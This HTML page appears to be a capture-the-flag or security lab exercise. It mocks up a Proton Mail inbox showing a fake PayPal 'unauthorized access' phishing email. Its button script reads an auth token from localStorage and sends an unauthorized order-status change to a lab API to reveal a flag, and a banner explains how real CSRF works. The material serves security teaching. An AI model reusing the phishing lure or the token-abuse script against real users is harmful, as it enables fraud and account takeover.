<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Proton Mail</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          "Helvetica Neue", Arial, sans-serif;
        background-color: #1c1c1c;
        color: #e5e5e5;
        height: 100vh;
        overflow: hidden;
      }

      .proton-container {
        display: flex;
        flex-direction: column;
        height: 100vh;
      }

      .header {
        background-color: #2a2a2a;
        border-bottom: 1px solid #3a3a3a;
        padding: 0 16px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        min-height: 56px;
        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
      }

      .header-left {
        display: flex;
        align-items: center;
        gap: 24px;
      }

      .logo {
        display: flex;
        align-items: center;
        gap: 8px;
        padding: 8px 12px;
        background: linear-gradient(135deg, #6d4aff 0%, #8b5cf6 100%);
        border-radius: 4px;
      }

      .logo svg {
        width: 20px;
        height: 20px;
      }

      .logo-text {
        font-size: 16px;
        font-weight: 600;
        color: #fff;
      }

      .app-switcher {
        width: 20px;
        height: 20px;
        display: flex;
        flex-wrap: wrap;
        gap: 2px;
        cursor: pointer;
      }

      .app-switcher div {
        width: 8px;
        height: 8px;
        background-color: #8e8e8e;
        border-radius: 1px;
      }

      .search-box {
        flex: 1;
        max-width: 600px;
        background-color: #1c1c1c;
        border-radius: 4px;
        padding: 8px 12px;
        display: flex;
        align-items: center;
        gap: 8px;
        border: 1px solid #3a3a3a;
      }

      .search-box:focus-within {
        border-color: #6d4aff;
      }

      .search-icon {
        color: #8e8e8e;
        width: 18px;
        height: 18px;
      }

      .icon {
        width: 18px;
        height: 18px;
        fill: currentColor;
        flex-shrink: 0;
      }

      .search-input {
        flex: 1;
        border: none;
        background: transparent;
        outline: none;
        font-size: 14px;
        color: #e5e5e5;
      }

      .search-input::placeholder {
        color: #8e8e8e;
      }

      .header-right {
        display: flex;
        align-items: center;
        gap: 16px;
      }

      .user-info {
        display: flex;
        flex-direction: column;
        align-items: flex-end;
        gap: 2px;
      }

      .user-name {
        font-size: 14px;
        color: #e5e5e5;
      }

      .user-email {
        font-size: 12px;
        color: #8e8e8e;
      }

      .settings-icon {
        width: 20px;
        height: 20px;
        color: #8e8e8e;
        cursor: pointer;
      }

      .avatar {
        width: 32px;
        height: 32px;
        border-radius: 50%;
        background: linear-gradient(135deg, #6d4aff 0%, #8b5cf6 100%);
        display: flex;
        align-items: center;
        justify-content: center;
        color: #fff;
        font-weight: 600;
        font-size: 14px;
      }

      .main-content {
        display: flex;
        flex: 1;
        overflow: hidden;
      }

      .sidebar {
        width: 240px;
        background-color: #1c1c1c;
        border-right: 1px solid #3a3a3a;
        padding: 16px 0;
        overflow-y: auto;
        display: flex;
        flex-direction: column;
      }

      .compose-btn {
        margin: 0 16px 16px;
        padding: 10px 16px;
        background-color: #6d4aff;
        border: none;
        border-radius: 4px;
        font-size: 14px;
        font-weight: 500;
        color: #fff;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        transition: background-color 0.2s;
        width: calc(100% - 32px);
      }

      .compose-btn:hover {
        background-color: #5a3dd9;
      }

      .sidebar-menu {
        list-style: none;
        padding: 0;
        flex: 1;
      }

      .sidebar-menu li {
        margin: 2px 0;
      }

      .sidebar-menu-item {
        display: flex;
        align-items: center;
        gap: 12px;
        padding: 8px 16px;
        color: #8e8e8e;
        text-decoration: none;
        font-size: 14px;
        border-radius: 0;
        transition: background-color 0.15s;
      }

      .sidebar-menu-item:hover {
        background-color: #2a2a2a;
      }

      .sidebar-menu-item.active {
        background-color: #2a2a2a;
        color: #e5e5e5;
        font-weight: 500;
      }

      .sidebar-menu-item.active .icon {
        fill: #6d4aff;
      }

      .sidebar-footer {
        padding: 16px;
        border-top: 1px solid #3a3a3a;
        margin-top: auto;
        font-size: 11px;
        color: #8e8e8e;
      }

      .email-view {
        flex: 1;
        display: flex;
        flex-direction: column;
        background-color: #1c1c1c;
        overflow-y: auto;
      }

      .email-toolbar {
        padding: 12px 16px;
        border-bottom: 1px solid #3a3a3a;
        display: flex;
        align-items: center;
        gap: 8px;
      }

      .email-header {
        padding: 24px 32px;
        border-bottom: 1px solid #3a3a3a;
      }

      .email-subject {
        font-size: 20px;
        font-weight: 500;
        color: #e5e5e5;
        margin-bottom: 16px;
      }

      .email-meta {
        display: flex;
        align-items: center;
        gap: 16px;
        font-size: 14px;
        color: #8e8e8e;
      }

      .email-from {
        color: #e5e5e5;
        font-weight: 500;
      }

      .email-date {
        color: #8e8e8e;
      }

      .email-body {
        padding: 32px;
        line-height: 1.6;
        font-size: 14px;
        color: #e5e5e5;
      }

      .email-body p {
        margin-bottom: 16px;
      }

      .email-body ul {
        margin-bottom: 16px;
      }

      .email-body li {
        margin-bottom: 8px;
      }

      .email-cta {
        margin: 24px 0;
      }

      .cta-button {
        display: inline-block;
        padding: 10px 24px;
        background-color: #6d4aff;
        color: #fff;
        text-decoration: none;
        border-radius: 4px;
        font-size: 14px;
        font-weight: 500;
        transition: background-color 0.2s;
      }

      .cta-button:hover {
        background-color: #5a3dd9;
      }

      .email-footer {
        margin-top: 32px;
        padding-top: 16px;
        border-top: 1px solid #3a3a3a;
        font-size: 12px;
        color: #8e8e8e;
      }

      .warning-banner {
        background-color: #3a2e00;
        border: 1px solid #ffc107;
        border-radius: 4px;
        padding: 16px;
        margin: 16px 32px;
        font-size: 12px;
        color: #ffc107;
        line-height: 1.6;
      }

      .warning-banner strong {
        color: #ffc107;
      }

      .right-sidebar {
        width: 48px;
        background-color: #1c1c1c;
        border-left: 1px solid #3a3a3a;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 16px 8px;
        gap: 16px;
      }

      .service-icon {
        width: 24px;
        height: 24px;
        color: #8e8e8e;
        cursor: pointer;
        transition: color 0.2s;
      }

      .service-icon:hover {
        color: #e5e5e5;
      }

      @media (max-width: 768px) {
        .sidebar {
          width: 72px;
        }

        .sidebar-menu-item span {
          display: none;
        }

        .compose-btn span {
          display: none;
        }

        .search-box {
          max-width: 200px;
        }
      }
    </style>
  </head>
  <body>
    <div class="proton-container">
      <header class="header">
        <div class="header-left">
          <div class="logo">
            <span class="logo-text">ProtonMail</span>
          </div>
          <div class="app-switcher">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
          </div>
          <div class="search-box">
            <svg class="search-icon icon" viewBox="0 0 24 24">
              <path
                d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"
              />
            </svg>
            <input
              type="text"
              class="search-input"
              placeholder="Search messages"
              readonly
            />
          </div>
        </div>
        <div class="header-right">
          <div class="user-info">
            <div class="user-name">Charlie Gullible</div>
            <div class="user-email">admin@oss.com</div>
          </div>
          <svg class="settings-icon icon" viewBox="0 0 24 24">
            <path
              d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.64l-1.92-3.32c-.12-.22-.37-.3-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.22-.08.5.12.64l2.03 1.58c-.05.3-.07.62-.07.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.64l1.92 3.32c.12.22.37.3.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.5-.12-.64l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"
            />
          </svg>
          <div class="avatar">CG</div>
        </div>
      </header>

      <div class="main-content">
        <aside class="sidebar">
          <button class="compose-btn">
            <svg
              class="icon"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
            >
              <path d="M12 5v14M5 12h14" />
            </svg>
            <span>New message</span>
          </button>
          <ul class="sidebar-menu">
            <li>
              <a href="#" class="sidebar-menu-item active">
                <svg class="icon" viewBox="0 0 24 24">
                  <path
                    d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5v-3h3.56c.69 1.19 1.97 2 3.45 2s2.75-.81 3.45-2H19v3zm0-5h-4.99c0 1.1-.9 2-2 2s-2-.9-2-2H5V5h14v9z"
                  />
                </svg>
                <span>Inbox</span>
              </a>
            </li>
            <li>
              <a href="#" class="sidebar-menu-item">
                <svg class="icon" viewBox="0 0 24 24">
                  <path
                    d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"
                  />
                </svg>
                <span>Starred</span>
              </a>
            </li>
            <li>
              <a href="#" class="sidebar-menu-item">
                <svg class="icon" viewBox="0 0 24 24">
                  <path
                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"
                  />
                </svg>
                <span>Drafts</span>
              </a>
            </li>
            <li>
              <a href="#" class="sidebar-menu-item">
                <svg class="icon" viewBox="0 0 24 24">
                  <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z" />
                </svg>
                <span>Sent</span>
              </a>
            </li>
            <li>
              <a href="#" class="sidebar-menu-item">
                <svg class="icon" viewBox="0 0 24 24">
                  <path
                    d="M20.54 5.23l-1.39-1.68C18.88 3.21 18.47 3 18 3H6c-.47 0-.88.21-1.16.55L3.46 5.23C3.17 5.57 3 6.02 3 6.5V19c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V6.5c0-.48-.17-.93-.46-1.27zM12 17.5L6.5 12H10v-2h4v2h3.5L12 17.5zM5.12 5l.81-1h12l.94 1H5.12z"
                  />
                </svg>
                <span>Archive</span>
              </a>
            </li>
          </ul>
          <div class="sidebar-footer">
            <div>Storage: 8.18 GB / 17.00 GB</div>
            <div style="margin-top: 4px">v5.0.97.7 β</div>
          </div>
        </aside>

        <main class="email-view">
          <div class="email-toolbar"></div>
          <div class="email-header">
            <h1 class="email-subject">
              Security Alert: Unauthorized Access Detected
            </h1>
            <div class="email-meta">
              <span class="email-from"
                >PayPal Security &lt;security@paypal.com&gt;</span
              >
              <span class="email-date">Today, 2:34 PM</span>
            </div>
          </div>

          <div class="email-body">
            <p>Dear Charlie Gullible,</p>

            <p>
              We detected a sign-in to your PayPal account from a new device or
              location. If this was you, no action is needed.
            </p>

            <p>
              <strong
                >However, if you did not authorize this access, your account may
                be compromised.</strong
              >
            </p>

            <p>For your security, we strongly recommend that you:</p>
            <ul style="margin-left: 20px; margin-bottom: 16px">
              <li>Change your password immediately</li>
              <li>Review your recent account activity</li>
              <li>Enable two-factor authentication if not already enabled</li>
            </ul>

            <p>
              To secure your account, please click the button below to sign in
              and update your password:
            </p>

            <div class="email-cta">
              <a
                href="#"
                class="cta-button"
                onclick="
                  event.preventDefault();
                  submitForm();
                "
                >Secure My Account Now</a
              >
            </div>

            <p
              style="
                margin-top: 24px;
                padding: 12px;
                background-color: #2a2a2a;
                border-left: 3px solid #ffc107;
                border-radius: 4px;
              "
            >
              <strong>⚠️ Important:</strong> This is a time-sensitive security
              matter. Please take action within the next 24 hours to prevent
              potential unauthorized transactions.
            </p>

            <p>
              If you have any questions or believe this email was sent in error,
              please contact our security team immediately.
            </p>

            <p>Thank you for helping us keep your account secure.</p>

            <div class="email-footer">
              <p>
                <strong>PayPal Security Team</strong><br />
                PayPal, Inc.<br />
                security@paypal.com
              </p>
              <p style="margin-top: 12px; font-size: 11px; color: #6e6e6e">
                This is an automated security notification. Please do not reply
                to this email.
              </p>
            </div>
          </div>

          <div class="warning-banner">
            <div style="display: flex; flex-direction: column; gap: 8px">
              <strong>CSRF Attack Demonstration - Important Note:</strong>
              <span>This page simulates a CSRF attack.</span>
              <span
                ><strong>This demonstration uses localStorage:</strong> The page
                reads your authentication token from localStorage and uses it to
                execute an unauthorized operation. This works because the
                malicious page is hosted on the same domain as the application
                (same-origin policy allows access to localStorage).</span
              >
              <span
                ><strong>In a real-world CSRF attack:</strong> The application
                would use cookies for authentication instead of localStorage. In
                that scenario, the attack would work from any external domain
                because browsers automatically include cookies with cross-origin
                requests (when sameSite is not set to "strict"). The attacker
                wouldn't need access to localStorage - a simple HTML form
                submission would be sufficient.</span
              >
            </div>
          </div>
        </main>

        <aside class="right-sidebar">
          <svg class="service-icon icon" viewBox="0 0 24 24">
            <path
              d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zm0-12H5V6h14v2z"
            />
          </svg>
          <svg class="service-icon icon" viewBox="0 0 24 24">
            <path
              d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"
            />
          </svg>
          <svg class="service-icon icon" viewBox="0 0 24 24">
            <path
              d="M20 6h-2.18c.11-.31.18-.63.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35l-.5.67-.5-.68C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .37.07.69.18 1H4c-1.11 0-1.99.89-1.99 2L2 19c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zM9 4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h5.08L7 10.83 8.62 12 11 8.76l1-1.36 1 1.36L15.38 12 17 10.83 14.92 8H20v6z"
            />
          </svg>
          <svg class="service-icon icon" viewBox="0 0 24 24">
            <path
              d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"
            />
          </svg>
        </aside>
      </div>
    </div>

    <script>
      async function submitForm() {
        const token = localStorage.getItem("authToken");

        if (!token) {
          alert("You must be logged in for this attack to work!");
          return;
        }

        try {
          const baseUrl = window.location.origin;
          const response = await fetch(`${baseUrl}/api/orders/ORD-003`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${token}`,
            },
            body: JSON.stringify({
              status: "DELIVERED",
            }),
          });

          const data = await response.json();

          if (response.ok) {
            alert(
              "Order status updated successfully. Check the console for the flag."
            );
            console.log("CSRF Attack Response:", data);
            if (data.flag) {
              console.log("Flag:", data.flag);
            }
          } else {
            alert("Failed to update order: " + (data.error || "Unknown error"));
          }
        } catch (error) {
          alert("Error: " + error.message);
          console.error("CSRF Attack Error:", error);
        }
      }
    </script>
  </body>
</html>
